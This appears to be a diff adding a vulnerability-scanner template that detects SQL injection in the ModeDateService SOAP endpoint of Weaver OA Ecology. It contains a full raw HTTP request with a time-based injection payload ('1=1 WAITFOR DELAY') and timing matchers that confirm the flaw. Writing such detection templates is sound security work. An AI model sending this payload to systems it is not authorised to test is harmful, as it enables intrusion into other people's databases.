@@ -1,0 +1,52 @@
+id: weaver-ecology-modedateservice-sqli
+info:
+  name: Weaver OA Ecology ModeDateService SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the ModeDateService endpoint of Weaver OA Ecology. The vulnerability allows an attacker to execute arbitrary SQL queries by injecting payloads into the SOAP request.
+
+variables:
+  delay: "{{rand_int(5, 10)}}"
+
+http:
+  - raw:
+      - |
+        POST /services/ModeDateService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: ""
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mod="http://localhost/services/ModeDateService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <mod:getAllModeDataCount>
+                <mod:in0>1</mod:in0>
+                <mod:in1>1</mod:in1>
+                <mod:in2>1=1 WAITFOR DELAY '0:0:{{delay}}'</mod:in2>
+                <mod:in3>1</mod:in3>
+              </mod:getAllModeDataCount>
+            </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "services/ModeDateService"
+        part: body
+      - type: word
+        words:
+          - "ecology_JSessionid="
+        part: header
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+      - type: dsl
+        dsl:
+          - duration >= to_number(delay)
+          - duration <= to_number(delay) + 2
